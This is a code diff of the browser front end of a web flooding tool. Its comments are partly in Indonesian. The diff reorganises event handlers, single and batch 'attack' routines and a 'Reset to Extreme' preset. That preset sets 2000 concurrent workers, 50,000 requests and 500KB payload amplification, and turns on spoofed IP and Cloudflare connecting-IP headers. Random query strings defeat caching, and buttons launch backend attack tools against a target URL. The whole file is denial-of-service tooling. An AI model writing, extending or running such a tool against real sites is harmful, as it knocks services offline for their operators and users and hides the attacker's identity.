@@ -1,4 +1,4 @@
-// DOM elements
+// ======================== DOM Elements ========================
 const targetUrl = document.getElementById('targetUrl');
 const method = document.getElementById('method');
 const httpVersion = document.getElementById('httpVersion');
@@ -47,7 +47,7 @@ const websocket = document.getElementById('websocket');
 const quicFlood = document.getElementById('quicFlood');
 const dualConnection = document.getElementById('dualConnection');
 const continuousToggle = document.getElementById('continuousToggle');
-const intervalMs = document.getElementById('intervalMs');
+const intervalMsInput = document.getElementById('intervalMs');
 const amplifyToggle = document.getElementById('amplifyToggle');
 const amplifyControls = document.getElementById('amplifyControls');
 const amplifyKb = document.getElementById('amplifyKb');
@@ -65,64 +65,12 @@ const btnArtillery = document.getElementById('btnArtillery');
 const btnLoadtest = document.getElementById('btnLoadtest');
 const btnCombined = document.getElementById('btnCombined');
 
+// ======================== State Variables ========================
 let amplificationEnabled = false;
 let amplificationKB = 500;
 let amplificationTypeSel = 'normal';
 let continuousMode = false;
 let intervalMsVal = 5000;
-
-if (amplifyToggle) {
-    amplifyToggle.addEventListener('change', () => {
-        amplificationEnabled = amplifyToggle.checked;
-        amplifyControls.style.display = amplificationEnabled ? 'block' : 'none';
-    });
-}
-if (amplifyKb) {
-    amplifyKb.addEventListener('input', () => {
-        amplificationKB = parseFloat(amplifyKb.value);
-        amplifyValue.innerText = amplificationKB + ' KB';
-    });
-}
-if (amplifyType) {
-    amplifyType.addEventListener('change', () => { amplificationTypeSel = amplifyType.value; });
-}
-if (continuousToggle) {
-    continuousToggle.addEventListener('change', () => { continuousMode = continuousToggle.checked; });
-}
-if (intervalMs) {
-    intervalMs.addEventListener('change', () => { intervalMsVal = parseInt(intervalMs.value) || 5000; });
-}
-
-resetExtremeBtn?.addEventListener('click', () => {
-    concurrencyInput.value = 2000;
-    totalInput.value = 50000;
-    timeoutInput.value = 5000;
-    retryInput.value = 0;
-    randomDelayInput.value = 0;
-    attackTypeSelect.value = 'normal';
-    amplifyToggle.checked = true;
-    amplifyToggle.dispatchEvent(new Event('change'));
-    amplifyKb.value = 500;
-    amplifyKb.dispatchEvent(new Event('input'));
-    amplifyType.value = 'normal';
-    forceSuccessCheck.checked = true;
-    queryDepan.checked = true;
-    queryBelakang.checked = true;
-    onlineHost.checked = true;
-    forwardHost.checked = true;
-    reverseProxy.checked = true;
-    pengarah.checked = true;
-    websocket.checked = false;
-    quicFlood.checked = false;
-    dualConnection.checked = false;
-    continuousToggle.checked = false;
-    spoofIp.checked = true;
-    spoofRealIp.checked = true;
-    spoofCfConnecting.checked = true;
-    addLog("⚙️ Reset to Extreme: concurrency 2000, total 50k, amplification 500KB, spoofing on");
-});
-
-// Chart & state
 let chart;
 let abortController = null;
 let isRunning = false;
@@ -136,6 +84,7 @@ let heartbeatInterval = null;
 let lastTrafficUpdate = 0;
 let lastTotalBytes = 0;
 
+// ======================== Helper Functions ========================
 function updateTrafficEstimator() {
     const now = Date.now();
     if (lastTrafficUpdate !== 0 && now - lastTrafficUpdate >= 1000) {
@@ -203,15 +152,15 @@ function resetStats() {
     updateUI();
 }
 
-// Helper functions untuk spoofing, random, dll (sama seperti kode sebelumnya)
+// Random helpers
 function randomIP(prefix) { return prefix + Math.floor(Math.random() * 255); }
 function randomRange() { const s = Math.floor(Math.random()*1000); return `bytes=${s}-${s+Math.floor(Math.random()*500)}`; }
 function randomAcceptLanguage() { const langs = ['en-US,en;q=0.9','id-ID,id;q=0.9','de-DE,de;q=0.8','ja-JP,ja;q=0.8']; return langs[Math.floor(Math.random()*langs.length)]; }
 function parseCustomHeaders(jsonStr) { try { return JSON.parse(jsonStr); } catch(e){ return {}; } }
 function parseCookies(cookieStr) { const obj = {}; cookieStr.split(';').forEach(c => { let [k,v]=c.trim().split('='); if(k) obj[k]=v||''; }); return obj; }
-const userAgentsBase = [/* banyak user agent */];
-function randomUserAgent() { return 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36'; }
+function randomUserAgent() { return 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36'; } // can be expanded
 
+// Build URL dengan query depan/belakang
 function buildUrlWithQuery(baseUrl) {
     let url = baseUrl;
     if (queryDepan?.checked) url += (url.includes('?') ? '&' : '?') + `_r=${Math.random().toString(36).substring(2,10)}`;
@@ -219,6 +168,7 @@ function buildUrlWithQuery(baseUrl) {
     return url;
 }
 
+// Build headers berdasarkan opsi
 function buildAdvancedHeaders(targetHost) {
     let headers = {};
     headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
@@ -242,7 +192,7 @@ function buildAdvancedHeaders(targetHost) {
     return headers;
 }
 
-// SINGLE ATTACK
+// ======================== SINGLE ATTACK ========================
 async function sendSingleRequest(url, method, body, timeout, retryCount, randomDelay, keepAlive, attackType) {
     let finalUrl = buildUrlWithQuery(url);
     let finalHeaders = buildAdvancedHeaders(new URL(url).hostname);
@@ -337,7 +287,7 @@ async function startSingleAttack() {
     startBtn.disabled = true;
     batchBtn.disabled = true;
     stopBtn.disabled = false;
-    addLog(`💀 SINGLE ATTACK | ${mtd} ${url} | Type:${attackType} | Amp:${amplificationEnabled?amplificationKB+"KB":"OFF"} | Concurrency:${concurrency} | QUIC:${quicFlood?.checked?"ON":"OFF"}`);
+    addLog(`💀 SINGLE ATTACK | ${mtd} ${url} | Type:${attackType} | Amp:${amplificationEnabled?amplificationKB+"KB":"OFF"} | Concurrency:${concurrency}`);
     const onDone = (success, duration, err, retries, size, statusCode, responseBody) => {
         const retriesUsed = (typeof retries === 'number' && !isNaN(retries)) ? retries : 0;
         let finalSuccess = success;
@@ -360,7 +310,7 @@ async function startSingleAttack() {
     try {
         await runSingleAttack(url, mtd, body, total, concurrency, timeout, retryCount, randomDelay, keepAlive, attackType, onDone, abortController.signal);
         const elapsed = ((Date.now() - stats.startTime)/1000).toFixed(2);
-        addLog(`🔥 FINISHED | Success:${stats.success} Failed:${stats.fail} Time:${elapsed}s | Data: ${(stats.totalBytes/1024).toFixed(1)} KB | Mbps: ${trafficMbpsSpan.innerText}`);
+        addLog(`🔥 FINISHED | Success:${stats.success} Failed:${stats.fail} Time:${elapsed}s | Data: ${(stats.totalBytes/1024).toFixed(1)} KB`);
     } catch(e) { addLog(`System error: ${e.message}`, true); }
     finally {
         isRunning = false;
@@ -372,16 +322,16 @@ async function startSingleAttack() {
     }
 }
 
+// ======================== BATCH ATTACK ========================
 async function startBatchAttack() {
     if (isRunning) { addLog("Attack already running!", true); return; }
     let url = targetUrl.value.trim();
     if (!url) { addLog("URL required", true); return; }
     if (!url.startsWith("http")) url = "https://" + url;
-    const total = parseInt(totalInput.value);
-    const concurrency = parseInt(concurrencyInput.value);
-    if (isNaN(total) || isNaN(concurrency)) { addLog("Invalid total/concurrency", true); return; }
     const mtd = method.value;
     let body = payload.value;
+    const total = parseInt(totalInput.value);
+    const concurrency = parseInt(concurrencyInput.value);
     const timeout = parseInt(timeoutInput.value);
     const retryCount = parseInt(retryInput.value);
     const randomDelay = parseInt(randomDelayInput.value);
@@ -392,7 +342,7 @@ async function startBatchAttack() {
     const multiplier = dualConnection?.checked ? 2 : 1;
     const actualTotal = total * multiplier;
     const actualConcurrency = Math.min(concurrency * multiplier, 10000);
-    addLog(`💀 BATCH ATTACK | ${mtd} ${url} | Total:${actualTotal} | Workers:${actualConcurrency} | QUIC:${quicFlood?.checked?"ON":"OFF"}`);
+    addLog(`💀 BATCH ATTACK | ${mtd} ${url} | Total:${actualTotal} | Workers:${actualConcurrency}`);
     startBtn.disabled = true;
     batchBtn.disabled = true;
     stopBtn.disabled = false;
@@ -459,7 +409,7 @@ function exportCSV() {
     addLog("CSV exported");
 }
 
-// Autocannon, Artillery, Loadtest, Combined
+// ======================== AUTOCANNON, ARTILLERY, LOADTEST, COMBINED ========================
 async function runAttackTool(endpoint, body) {
     if (isRunning) { addLog("Another attack is running. Stop it first.", true); return; }
     let url = targetUrl.value.trim();
@@ -469,7 +419,7 @@ async function runAttackTool(endpoint, body) {
     body.method = method.value;
     body.headers = buildAdvancedHeaders(new URL(url).hostname);
     body.body = payload.value;
-    addLog(`Memulai ${endpoint.split('/').pop()} attack ke ${url}...`);
+    addLog(`🚀 Memulai ${endpoint.split('/').pop()} attack ke ${url}...`);
     try {
         const res = await fetch(endpoint, {
             method: 'POST',
@@ -515,7 +465,7 @@ btnCombined.onclick = () => {
     });
 };
 
-// Health & active users
+// ======================== HEALTH, PREVIEW, ACTIVE USERS ========================
 async function checkTargetHealth(url) {
     try {
         const start = performance.now();
@@ -539,6 +489,38 @@ function startHealthCheck() { if(healthCheckInterval) clearInterval(healthCheckI
 async function updateActiveUsers() { try { const res = await fetch('/api/heartbeat'); const data = await res.json(); activeUsersSpan.innerText = data.active; } catch(e) {} }
 function startHeartbeat() { heartbeatInterval = setInterval(updateActiveUsers, 30000); updateActiveUsers(); }
 
+// ======================== RESET EXTREME ========================
+resetExtremeBtn.onclick = () => {
+    concurrencyInput.value = 2000;
+    totalInput.value = 50000;
+    timeoutInput.value = 5000;
+    retryInput.value = 0;
+    randomDelayInput.value = 0;
+    attackTypeSelect.value = 'normal';
+    amplifyToggle.checked = true;
+    amplificationEnabled = true;
+    amplifyControls.style.display = 'block';
+    amplifyKb.value = 500;
+    amplifyKb.dispatchEvent(new Event('input'));
+    amplifyType.value = 'normal';
+    forceSuccessCheck.checked = true;
+    queryDepan.checked = true;
+    queryBelakang.checked = true;
+    onlineHost.checked = true;
+    forwardHost.checked = true;
+    reverseProxy.checked = true;
+    pengarah.checked = true;
+    websocket.checked = false;
+    quicFlood.checked = false;
+    dualConnection.checked = false;
+    continuousToggle.checked = false;
+    spoofIp.checked = true;
+    spoofRealIp.checked = true;
+    spoofCfConnecting.checked = true;
+    addLog("⚙️ Reset to Extreme: concurrency 2000, total 50k, amplification 500KB, spoofing on");
+};
+
+// ======================== INITIALIZATION ========================
 window.onload = () => {
     if (rtChartCanvas) {
         const ctx = rtChartCanvas.getContext('2d');
@@ -548,15 +530,29 @@ window.onload = () => {
             options: { responsive: true, maintainAspectRatio: true, scales: { y: { title: { display: true, text: 'ms' } } } }
         });
     }
+    // Attach event listeners
     startBtn.onclick = startSingleAttack;
     batchBtn.onclick = startBatchAttack;
     stopBtn.onclick = stopAttack;
     exportBtn.onclick = exportCSV;
+    // Amplification toggle
+    amplifyToggle.onchange = () => {
+        amplificationEnabled = amplifyToggle.checked;
+        amplifyControls.style.display = amplificationEnabled ? 'block' : 'none';
+    };
+    amplifyKb.oninput = () => {
+        amplificationKB = parseFloat(amplifyKb.value);
+        amplifyValue.innerText = amplificationKB + ' KB';
+    };
+    amplifyType.onchange = () => { amplificationTypeSel = amplifyType.value; };
+    continuousToggle.onchange = () => { continuousMode = continuousToggle.checked; };
+    intervalMsInput.onchange = () => { intervalMsVal = parseInt(intervalMsInput.value) || 5000; };
+    // Initial fetch status
     fetch('/api/status').then(r=>r.json()).then(d=>addLog(`Backend: ${d.message}`)).catch(()=>addLog("Backend OK"));
     let u = targetUrl.value.trim(); if(u) updatePreview(u);
     startHealthCheck();
     startHeartbeat();
+    // Initialize amplification display
     amplifyToggle.dispatchEvent(new Event('change'));
-    continuousToggle.dispatchEvent(new Event('change'));
     amplifyKb.dispatchEvent(new Event('input'));
 };
